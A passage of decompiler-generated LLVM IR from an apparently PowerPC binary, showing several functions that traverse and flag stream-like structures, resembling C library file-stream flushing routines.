  %v3_10012aec = zext i16 %v2_10012aec to i32
  store i32 %v3_10012aec, i32* %r0.global-to-local, align 4
  %v1_10012af0 = add i32 %v1_10012adc, 4096
  store i32 %v1_10012af0, i32* %r9.global-to-local, align 4
  %v2_10012af4 = add i32 %v1_10012b04, 12
  %v3_10012af4 = inttoptr i32 %v2_10012af4 to i32*
  store i32 %v1_10012af0, i32* %v3_10012af4, align 4
  %v0_10012af8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012af8 = or i32 %v0_10012af8, 16384
  store i32 %v1_10012af8, i32* %r0.global-to-local, align 4
  %v1_10012afc = trunc i32 %v1_10012af8 to i16
  %v2_10012afc = load i32, i32* @r31, align 4
  %v3_10012afc = inttoptr i32 %v2_10012afc to i16*
  store i16 %v1_10012afc, i16* %v3_10012afc, align 2
  br label %dec_label_pc_10012b08

dec_label_pc_10012b04:                            ; preds = %dec_label_pc_10012ad8
  %v2_10012b04 = add i32 %v1_10012b04, 12
  %v3_10012b04 = inttoptr i32 %v2_10012b04 to i32*
  store i32 0, i32* %v3_10012b04, align 4
  br label %dec_label_pc_10012b08

dec_label_pc_10012b08:                            ; preds = %dec_label_pc_10012a70, %dec_label_pc_10012aec, %dec_label_pc_10012b04
  %v0_10012b08 = load i32, i32* @r31, align 4
  %v1_10012b08 = add i32 %v0_10012b08, 8
  %v2_10012b08 = inttoptr i32 %v1_10012b08 to i32*
  %v3_10012b08 = load i32, i32* %v2_10012b08, align 4
  store i32 %v3_10012b08, i32* %r9.global-to-local, align 4
  %v3_10012b10 = add i32 %v0_10012b08, 2
  %v4_10012b10 = inttoptr i32 %v3_10012b10 to i8*
  store i8 0, i8* %v4_10012b10, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012b18 = load i32, i32* @r31, align 4
  %v2_10012b18 = add i32 %v1_10012b18, 44
  %v3_10012b18 = inttoptr i32 %v2_10012b18 to i32*
  store i32 0, i32* %v3_10012b18, align 4
  %v0_10012b1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b1c = load i32, i32* @r31, align 4
  %v2_10012b1c = add i32 %v1_10012b1c, 20
  %v3_10012b1c = inttoptr i32 %v2_10012b1c to i32*
  store i32 %v0_10012b1c, i32* %v3_10012b1c, align 4
  %v0_10012b20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b20 = load i32, i32* @r31, align 4
  %v2_10012b20 = add i32 %v1_10012b20, 24
  %v3_10012b20 = inttoptr i32 %v2_10012b20 to i32*
  store i32 %v0_10012b20, i32* %v3_10012b20, align 4
  %v0_10012b24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b24 = load i32, i32* @r31, align 4
  %v2_10012b24 = add i32 %v1_10012b24, 28
  %v3_10012b24 = inttoptr i32 %v2_10012b24 to i32*
  store i32 %v0_10012b24, i32* %v3_10012b24, align 4
  %v0_10012b28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b28 = load i32, i32* @r31, align 4
  %v2_10012b28 = add i32 %v1_10012b28, 16
  %v3_10012b28 = inttoptr i32 %v2_10012b28 to i32*
  store i32 %v0_10012b28, i32* %v3_10012b28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v0_10012b30 = load i32, i32* @r31, align 4
  %v1_10012b30 = inttoptr i32 %v0_10012b30 to i16*
  %v2_10012b30 = load i16, i16* %v1_10012b30, align 2
  %v3_10012b30 = zext i16 %v2_10012b30 to i32
  %v3_10012b34 = load i32, i32* @global_var_1002b8e4.837, align 4
  store i32 %v3_10012b34, i32* %r0.global-to-local, align 4
  %v1_10012b38 = and i32 %v3_10012b30, 8192
  store i32 %v1_10012b38, i32* %r9.global-to-local, align 4
  %v3_10012b38 = icmp eq i32 %v1_10012b38, 0
  %v2_10012b3c = add i32 %v0_10012b30, 52
  %v3_10012b3c = inttoptr i32 %v2_10012b3c to i32*
  store i32 %v3_10012b34, i32* %v3_10012b3c, align 4
  br i1 %v3_10012b38, label %dec_label_pc_10012bc4, label %dec_label_pc_10012b44

dec_label_pc_10012b44:                            ; preds = %dec_label_pc_10012b08
  store i32 ptrtoint ([3 x i8]* @global_var_10010040.750 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.711 to i32), i32* %r29.global-to-local, align 4
  %v2_10012b54 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012b54, i32* @r26, align 4
  store i32 %v2_10012b54, i32* @r3, align 4
  %v0_10012b64 = call i32 @function_10010048()
  %v2_10012b70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012b70, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002b574.710 to i32), i32* @r29, align 4
  %v0_10012b78 = call i32 @function_10010040()
  store i32 %v2_10012b70, i32* @r3, align 4
  %v0_10012b88 = call i32 @function_10010048()
  %v0_10012b90 = call i32 @function_10010040()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012b98 = load i32, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  store i32 %v3_10012b98, i32* %r0.global-to-local, align 4
  store i32 %v2_10012b70, i32* @r3, align 4
  %v1_10012ba4 = load i32, i32* @r31, align 4
  %v2_10012ba4 = add i32 %v1_10012ba4, 32
  %v3_10012ba4 = inttoptr i32 %v2_10012ba4 to i32*
  store i32 %v3_10012b98, i32* %v3_10012ba4, align 4
  %v0_10012ba8 = load i32, i32* @r31, align 4
  store i32 %v0_10012ba8, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  %v0_10012bac = call i32 @function_10010048()
  store i32 %v2_10012b54, i32* @r3, align 4
  %v0_10012bb8 = call i32 @function_10010048()
  br label %dec_label_pc_10012bc4

dec_label_pc_10012bc0:                            ; preds = %dec_label_pc_10012970, %dec_label_pc_1001295c, %dec_label_pc_1001297c
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10012bc4

dec_label_pc_10012bc4:                            ; preds = %dec_label_pc_100129bc, %dec_label_pc_10012b08, %dec_label_pc_10012b44, %dec_label_pc_10012bc0
  store i32 %v0_10012920, i32* %r0.global-to-local, align 4
  %v0_10012bc8 = load i32, i32* @r31, align 4
  ret i32 %v0_10012bc8

; uselistorder directives
  uselistorder i32 %v1_10012b04, { 2, 0, 1 }
  uselistorder i32 %v1_10012adc, { 1, 0, 2 }
  uselistorder i32 %v1_10012a84, { 1, 0 }
  uselistorder i32 %v0_10012a74, { 1, 0 }
  uselistorder i32 %v1_100129c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100129ac, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r29.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 4096, { 13, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 21, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_1000c524, { 1, 0, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_1000c140, { 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1024, { 7, 6, 4, 5, 0, 1, 2, 3 }
  uselistorder i32 ()* @function_1000ca34, { 3, 2, 1, 0, 4 }
  uselistorder i32 56, { 3, 2, 5, 4, 0, 1 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 22, { 0, 15, 2, 13, 10, 3, 11, 4, 5, 16, 6, 17, 7, 14, 8, 9, 1, 12 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_10012bc4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10012bc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012b08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012a50, { 1, 0 }
  uselistorder label %dec_label_pc_100129e4, { 1, 0 }
  uselistorder label %dec_label_pc_100129b4, { 1, 0 }
  uselistorder label %dec_label_pc_100129a0, { 1, 0 }
  uselistorder label %dec_label_pc_1001298c, { 2, 0, 1 }
}

define i32 @function_10012bdc(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10012bdc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10012be0 = load i32, i32* @lr, align 4
  store i32 %v0_10012be0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_10012be8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10012bf4 = add i32 %arg1, 4
  %v2_10012bf4 = inttoptr i32 %v1_10012bf4 to i32*
  %v3_10012bf4 = load i32, i32* %v2_10012bf4, align 4
  %v2_10012bf8 = load i32, i32* %arg2, align 4
  %v1_10012bfc = add i32 %tmp, 4
  %v2_10012bfc = inttoptr i32 %v1_10012bfc to i32*
  %v3_10012bfc = load i32, i32* %v2_10012bfc, align 4
  store i32 268512260, i32* @lr, align 4
  %v4_10012c00 = call i32 @function_10014088(i32 %v3_10012bf4, i32 %v2_10012bf8, i32 %v3_10012bfc, i32 %arg3)
  %v1_10012c04 = icmp slt i32 %v4_10012c00, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10012c04, label %dec_label_pc_10012c1c, label %dec_label_pc_10012c10

dec_label_pc_10012c10:                            ; preds = %dec_label_pc_10012bdc
  %v1_10012c10 = load i32, i32* @r31, align 4
  %v2_10012c10 = inttoptr i32 %v1_10012c10 to i32*
  store i32 %v4_10012c00, i32* %v2_10012c10, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012c18 = load i32, i32* @r31, align 4
  %v2_10012c18 = add i32 %v1_10012c18, 4
  %v3_10012c18 = inttoptr i32 %v2_10012c18 to i32*
  store i32 %tmp, i32* %v3_10012c18, align 4
  %v0_10012c1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10012c1c

dec_label_pc_10012c1c:                            ; preds = %dec_label_pc_10012bdc, %dec_label_pc_10012c10
  %v0_10012c1c = phi i32 [ %tmp, %dec_label_pc_10012bdc ], [ %v0_10012c1c.pre, %dec_label_pc_10012c10 ]
  store i32 %v0_10012be0, i32* %r0.global-to-local, align 4
  store i32 %v0_10012be8, i32* @r31, align 4
  ret i32 %v0_10012c1c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10012c1c, { 1, 0 }
}

define i32 @function_10012c34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10012c34:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10012c3c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10012c3c, i32* %r28.global-to-local, align 4
  %v2_10012c64 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012c64, i32* @r3, align 4
  %v1_10012c68 = add i32 %arg3, 52
  %v2_10012c68 = inttoptr i32 %v1_10012c68 to i32*
  %v3_10012c68 = load i32, i32* %v2_10012c68, align 4
  %v3_10012c70 = icmp eq i32 %v3_10012c68, 0
  store i1 %v3_10012c70, i1* @cr4_eq, align 1
  br i1 %v3_10012c70, label %dec_label_pc_10012c78, label %dec_label_pc_10012c84

dec_label_pc_10012c78:                            ; preds = %dec_label_pc_10012c34
  %v0_10012c78 = call i32 @function_10010048()
  %v0_10012c80 = call i32 @function_10010040()
  %v0_10012c84.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10012c88.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10012c8c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10012c84

dec_label_pc_10012c84:                            ; preds = %dec_label_pc_10012c34, %dec_label_pc_10012c78
  %v0_10012c8c = phi i32 [ %v0_10012c3c, %dec_label_pc_10012c34 ], [ %v0_10012c8c.pre, %dec_label_pc_10012c78 ]
  %v0_10012c88 = phi i32 [ %arg3, %dec_label_pc_10012c34 ], [ %v0_10012c88.pre, %dec_label_pc_10012c78 ]
  %v0_10012c84 = phi i32 [ %arg2, %dec_label_pc_10012c34 ], [ %v0_10012c84.pre, %dec_label_pc_10012c78 ]
  store i32 268512404, i32* @lr, align 4
  %v3_10012c90 = inttoptr i32 %v0_10012c8c to i8*
  %v4_10012c90 = call i32 @function_10012f98(i8* %v3_10012c90, i32 %v0_10012c84, i32 %v0_10012c88)
  store i32 %v4_10012c90, i32* @r31, align 4
  store i32 %v2_10012c64, i32* @r3, align 4
  %v0_10012ca0 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10012ca0, label %dec_label_pc_10012ca4, label %dec_label_pc_10012ca8

dec_label_pc_10012ca4:                            ; preds = %dec_label_pc_10012c84
  %v0_10012ca4 = call i32 @function_10010048()
  %v0_10012cac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012ca8

dec_label_pc_10012ca8:                            ; preds = %dec_label_pc_10012c84, %dec_label_pc_10012ca4
  %v0_10012cac = phi i32 [ %v4_10012c90, %dec_label_pc_10012c84 ], [ %v0_10012cac.pre, %dec_label_pc_10012ca4 ]
  %v1_10012cc0 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10012c3c)
  ret i32 %v0_10012cac

; uselistorder directives
  uselistorder i32 %v0_10012c3c, { 1, 0, 2 }
  uselistorder i32 52, { 4, 5, 1, 6, 3, 2, 8, 7, 0 }
  uselistorder label %dec_label_pc_10012ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10012c84, { 1, 0 }
}

define i32 @function_10012cc8() local_unnamed_addr {
dec_label_pc_10012cc8:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010040.750 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.711 to i32), i32* @r29, align 4
  %v2_10012cec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012cec, i32* @r3, align 4
  %v0_10012cf4 = call i32 @function_10010048()
  %v0_10012cfc = call i32 @function_10010040()
  %v3_10012d04 = load i32, i32* @global_var_1002b930.831, align 4
  %v3_10012d08 = icmp eq i32 %v3_10012d04, 1
  br i1 %v3_10012d08, label %dec_label_pc_10012d10, label %dec_label_pc_10012db8

dec_label_pc_10012d10:                            ; preds = %dec_label_pc_10012cc8
  %v3_10012d14 = load i16*, i16** @global_var_1002b934.832, align 4
  %v2_10012d18 = icmp sgt i16* %v3_10012d14, null
  br i1 %v2_10012d18, label %dec_label_pc_10012d20, label %dec_label_pc_10012db8

dec_label_pc_10012d20:                            ; preds = %dec_label_pc_10012d10
  %v2_10012d2c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012d2c, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10012d38 = call i32 @function_10010048()
  %v0_10012d40 = call i32 @function_10010040()
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_10012d9810 = icmp eq i32 %storemerge7, 0
  %v0_10012d9c11 = load i32, i32* @r30, align 4
  br i1 %v3_10012d9810, label %dec_label_pc_10012da4, label %dec_label_pc_10012d50

dec_label_pc_10012d50:                            ; preds = %dec_label_pc_10012d20, %dec_label_pc_10012d98.backedge
  %v0_10012d9c16 = phi i32 [ %v0_10012d9c, %dec_label_pc_10012d98.backedge ], [ %v0_10012d9c11, %dec_label_pc_10012d20 ]
  %v3_10012d9c17.in = phi i32 [ %v0_10012d9c, %dec_label_pc_10012d98.backedge ], [ %v0_10012d9c11, %dec_label_pc_10012d20 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_10012d98.backedge ], [ %storemerge7, %dec_label_pc_10012d20 ]
  %v1_10012d50 = inttoptr i32 %storemerge15 to i16*
  %v2_10012d50 = load i16, i16* %v1_10012d50, align 2
  %v1_10012d54 = add i32 %storemerge15, 32
  %v2_10012d54 = inttoptr i32 %v1_10012d54 to i32*
  %v3_10012d54 = load i32, i32* %v2_10012d54, align 4
  store i32 %v3_10012d54, i32* @r31, align 4
  %v1_10012d58 = and i16 %v2_10012d50, -32720
  %v3_10012d5c = icmp eq i16 %v1_10012d58, 48
  br i1 %v3_10012d5c, label %dec_label_pc_10012d6c, label %dec_label_pc_10012d64

dec_label_pc_10012d64:                            ; preds = %dec_label_pc_10012d50
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_10012d98.backedge

dec_label_pc_10012d6c:                            ; preds = %dec_label_pc_10012d50
  %v3_10012d9c17 = icmp eq i32 %v3_10012d9c17.in, 0
  br i1 %v3_10012d9c17, label %dec_label_pc_10012d70, label %dec_label_pc_10012d7c

dec_label_pc_10012d70:                            ; preds = %dec_label_pc_10012d6c
  store i32 %v3_10012d54, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  br label %dec_label_pc_10012d80

dec_label_pc_10012d7c:                            ; preds = %dec_label_pc_10012d6c
  %v2_10012d7c = add i32 %v0_10012d9c16, 32
  %v3_10012d7c = inttoptr i32 %v2_10012d7c to i32*
  store i32 %v3_10012d54, i32* %v3_10012d7c, align 4
  %v0_10012d80.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012d80

dec_label_pc_10012d80:                            ; preds = %dec_label_pc_10012d70, %dec_label_pc_10012d7c
  %v0_10012d80 = phi i32 [ %storemerge15, %dec_label_pc_10012d70 ], [ %v0_10012d80.pre, %dec_label_pc_10012d7c ]
  %v1_10012d80 = inttoptr i32 %v0_10012d80 to i16*
  %v2_10012d80 = load i16, i16* %v1_10012d80, align 2
  %v1_10012d88 = and i16 %v2_10012d80, 8192
  %v3_10012d88 = icmp eq i16 %v1_10012d88, 0
  br i1 %v3_10012d88, label %dec_label_pc_10012d98.backedge, label %dec_label_pc_10012d90

dec_label_pc_10012d98.backedge:                   ; preds = %dec_label_pc_10012d80, %dec_label_pc_10012d64, %dec_label_pc_10012d90
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10012d98 = icmp eq i32 %storemerge, 0
  %v0_10012d9c = load i32, i32* @r30, align 4
  br i1 %v3_10012d98, label %dec_label_pc_10012da4, label %dec_label_pc_10012d50

dec_label_pc_10012d90:                            ; preds = %dec_label_pc_10012d80
  store i32 268512660, i32* @lr, align 4
  %v2_10012d90 = call i32 @function_1000f0b8(i32 %v0_10012d80)
  br label %dec_label_pc_10012d98.backedge

dec_label_pc_10012da4:                            ; preds = %dec_label_pc_10012d98.backedge, %dec_label_pc_10012d20
  store i32 %v2_10012d2c, i32* @r3, align 4
  %v0_10012dac = call i32 @function_10010048()
  %v0_10012db4 = load i32, i32* @r29, align 4
  %v4_10012db4 = inttoptr i32 %v0_10012db4 to i16*
  store i16* %v4_10012db4, i16** @global_var_1002b934.832, align 4
  %v3_10012dc0.pre = load i32, i32* @global_var_1002b930.831, align 4
  br label %dec_label_pc_10012db8

dec_label_pc_10012db8:                            ; preds = %dec_label_pc_10012d10, %dec_label_pc_10012cc8, %dec_label_pc_10012da4
  %v3_10012dc0 = phi i32 [ 1, %dec_label_pc_10012d10 ], [ %v3_10012d04, %dec_label_pc_10012cc8 ], [ %v3_10012dc0.pre, %dec_label_pc_10012da4 ]
  store i32 %v2_10012cec, i32* @r3, align 4
  %v1_10012dc8 = add i32 %v3_10012dc0, -1
  store i32 %v1_10012dc8, i32* @global_var_1002b930.831, align 4
  %v0_10012dd0 = call i32 @function_10010048()
  ret i32 %v0_10012dd0

; uselistorder directives
  uselistorder i32 %v0_10012d9c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10012d80, { 1, 0 }
  uselistorder i32 %v3_10012d54, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_1000f0b8, { 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 20, 19, 18, 17, 15 }
  uselistorder i16** @global_var_1002b934.832, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10012db8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012d98.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012d80, { 1, 0 }
  uselistorder label %dec_label_pc_10012d50, { 1, 0 }
}

define i32 @function_10012de8(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10012de8:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002b8e0.712 to i32), i32* %r9.global-to-local, align 4
  %v5_10012df8 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002b8e0.712 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10012df8, label %dec_label_pc_10012e1c, label %dec_label_pc_10012e10

dec_label_pc_10012e10:                            ; preds = %dec_label_pc_10012de8
  %v4_10012e10 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10012e10, label %dec_label_pc_10012e1c, label %dec_label_pc_10012f48

dec_label_pc_10012e1c:                            ; preds = %dec_label_pc_10012e10, %dec_label_pc_10012de8
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010040.750 to i32), i32* @r30, align 4
  %v2_10012e28 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012e28, i32* @r3, align 4
  %v0_10012e3c = call i32 @function_10010048()
  %v0_10012e44 = call i32 @function_10010040()
  %v3_10012e4c = load i32, i32* @global_var_1002b930.831, align 4
  store i32 %v2_10012e28, i32* @r3, align 4
  %v1_10012e60 = add i32 %v3_10012e4c, 1
  store i32 %v1_10012e60, i32* %r9.global-to-local, align 4
  store i32 %v1_10012e60, i32* @global_var_1002b930.831, align 4
  %v0_10012e68 = call i32 @function_10010048()
  store i32 %v2_10012e28, i32* @r3, align 4
  %v0_10012e78 = call i32 @function_10010048()
  %v0_10012e80 = call i32 @function_10010040()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012e88 = load i32, i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), align 4
  store i32 %v3_10012e88, i32* @r31, align 4
  store i32 %v2_10012e28, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  %v0_10012e98 = call i32 @function_10010048()
  %v0_10012f38.pr = load i32, i32* @r31, align 4
  %v3_10012f383 = icmp eq i32 %v0_10012f38.pr, 0
  br i1 %v3_10012f383, label %dec_label_pc_10012f40, label %dec_label_pc_10012ea0

dec_label_pc_10012ea0:                            ; preds = %dec_label_pc_10012e1c, %dec_label_pc_10012f34
  %v0_10012ebc = phi i32 [ %v3_10012f34, %dec_label_pc_10012f34 ], [ %v0_10012f38.pr, %dec_label_pc_10012e1c ]
  %v1_10012ea0 = inttoptr i32 %v0_10012ebc to i16*
  %v2_10012ea0 = load i16, i16* %v1_10012ea0, align 2
  %v3_10012ea0 = zext i16 %v2_10012ea0 to i32
  %v1_10012ea4 = and i32 %v3_10012ea0, 64
  store i32 %v1_10012ea4, i32* %r9.global-to-local, align 4
  %v3_10012ea4 = icmp eq i32 %v1_10012ea4, 0
  br i1 %v3_10012ea4, label %dec_label_pc_10012f34, label %dec_label_pc_10012eac

dec_label_pc_10012eac:                            ; preds = %dec_label_pc_10012ea0
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012eb0 = load i32, i32* @global_var_1002b8e4.837, align 4
  %v3_10012eb4 = icmp eq i32 %v3_10012eb0, 2
  br i1 %v3_10012eb4, label %dec_label_pc_10012ed8, label %dec_label_pc_10012ebc

dec_label_pc_10012ebc:                            ; preds = %dec_label_pc_10012eac
  store i32 %v2_10012e28, i32* @r3, align 4
  %v0_10012ecc = call i32 @function_10010048()
  %v0_10012ed4 = call i32 @function_10010040()
  %v0_10012ed8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012ed8

dec_label_pc_10012ed8:                            ; preds = %dec_label_pc_10012eac, %dec_label_pc_10012ebc
  %v0_10012eec = phi i32 [ %v0_10012ebc, %dec_label_pc_10012eac ], [ %v0_10012ed8.pre, %dec_label_pc_10012ebc ]
  %v1_10012ed8 = inttoptr i32 %v0_10012eec to i16*
  %v2_10012ed8 = load i16, i16* %v1_10012ed8, align 2
  %v3_10012ed8 = zext i16 %v2_10012ed8 to i32
  %v0_10012edc = load i32, i32* @r27, align 4
  %v2_10012edc = or i32 %v0_10012edc, %v3_10012ed8
  %v1_10012ee0 = and i32 %v2_10012edc, 832
  %v1_10012ee4 = xor i32 %v1_10012ee0, 320
  store i32 %v1_10012ee4, i32* %r9.global-to-local, align 4
  %v3_10012ee4 = icmp eq i32 %v1_10012ee4, 0
  br i1 %v3_10012ee4, label %dec_label_pc_10012eec, label %dec_label_pc_10012f18

dec_label_pc_10012eec:                            ; preds = %dec_label_pc_10012ed8
  store i32 %v0_10012eec, i32* @r3, align 4
  store i32 268513012, i32* @lr, align 4
  %v0_10012ef0 = call i32 @function_1000cb04()
  %v3_10012ef4 = icmp eq i32 %v0_10012ef0, 0
  br i1 %v3_10012ef4, label %dec_label_pc_10012f04, label %dec_label_pc_10012efc

dec_label_pc_10012efc:                            ; preds = %dec_label_pc_10012eec
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10012f18

dec_label_pc_10012f04:                            ; preds = %dec_label_pc_10012eec
  %v0_10012f04 = load i32, i32* @r31, align 4
  %v1_10012f04 = inttoptr i32 %v0_10012f04 to i16*
  %v2_10012f04 = load i16, i16* %v1_10012f04, align 2
  %v3_10012f04 = zext i16 %v2_10012f04 to i32
  %v1_10012f08 = add i32 %v0_10012f04, 8
  %v2_10012f08 = inttoptr i32 %v1_10012f08 to i32*
  %v3_10012f08 = load i32, i32* %v2_10012f08, align 4
  store i32 %v3_10012f08, i32* %r9.global-to-local, align 4
  %v1_10012f0c = call i32 @__asm_rlwinm(i32 %v3_10012f04, i32 0, i32 26, i32 24)
  %v2_10012f0c = trunc i32 %v1_10012f0c to i16
  %v1_10012f10 = load i32, i32* @r31, align 4
  %v2_10012f10 = add i32 %v1_10012f10, 28
  %v3_10012f10 = inttoptr i32 %v2_10012f10 to i32*
  store i32 %v3_10012f08, i32* %v3_10012f10, align 4
  %v3_10012f14 = load i32, i32* @r31, align 4
  %v4_10012f14 = inttoptr i32 %v3_10012f14 to i16*
  store i16 %v2_10012f0c, i16* %v4_10012f14, align 2
  br label %dec_label_pc_10012f18

dec_label_pc_10012f18:                            ; preds = %dec_label_pc_10012ed8, %dec_label_pc_10012efc, %dec_label_pc_10012f04
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012f1c = load i32, i32* @global_var_1002b8e4.837, align 4
  %v3_10012f20 = icmp eq i32 %v3_10012f1c, 2
  br i1 %v3_10012f20, label %dec_label_pc_10012f34, label %dec_label_pc_10012f28

dec_label_pc_10012f28:                            ; preds = %dec_label_pc_10012f18
  store i32 %v2_10012e28, i32* @r3, align 4
  %v0_10012f30 = call i32 @function_10010048()
  br label %dec_label_pc_10012f34

dec_label_pc_10012f34:                            ; preds = %dec_label_pc_10012f18, %dec_label_pc_10012ea0, %dec_label_pc_10012f28
  %v0_10012f34 = load i32, i32* @r31, align 4
  %v1_10012f34 = add i32 %v0_10012f34, 32
  %v2_10012f34 = inttoptr i32 %v1_10012f34 to i32*
  %v3_10012f34 = load i32, i32* %v2_10012f34, align 4
  store i32 %v3_10012f34, i32* @r31, align 4
  %v3_10012f38 = icmp eq i32 %v3_10012f34, 0
  br i1 %v3_10012f38, label %dec_label_pc_10012f40, label %dec_label_pc_10012ea0

dec_label_pc_10012f40:                            ; preds = %dec_label_pc_10012f34, %dec_label_pc_10012e1c
  store i32 ptrtoint (i32* @global_var_10012f44.840 to i32), i32* @lr, align 4
  %v0_10012f40 = call i32 @function_10012cc8()
  br label %dec_label_pc_10012f80

dec_label_pc_10012f48:                            ; preds = %dec_label_pc_10012e10
  %v3_10012f48 = load i16, i16* %arg1, align 2
  %v4_10012f48 = zext i16 %v3_10012f48 to i32
  store i32 0, i32* @r28, align 4
  %v1_10012f50 = and i32 %v4_10012f48, 64
  store i32 %v1_10012f50, i32* %r9.global-to-local, align 4
  %v3_10012f50 = icmp eq i32 %v1_10012f50, 0
  br i1 %v3_10012f50, label %dec_label_pc_10012f80, label %dec_label_pc_10012f58

dec_label_pc_10012f58:                            ; preds = %dec_label_pc_10012f48
  store i32 268513116, i32* @lr, align 4
  %v0_10012f58 = call i32 @function_1000cb04()
  store i32 -1, i32* @r28, align 4
  %v3_10012f60 = icmp eq i32 %v0_10012f58, 0
  br i1 %v3_10012f60, label %dec_label_pc_10012f68, label %dec_label_pc_10012f80

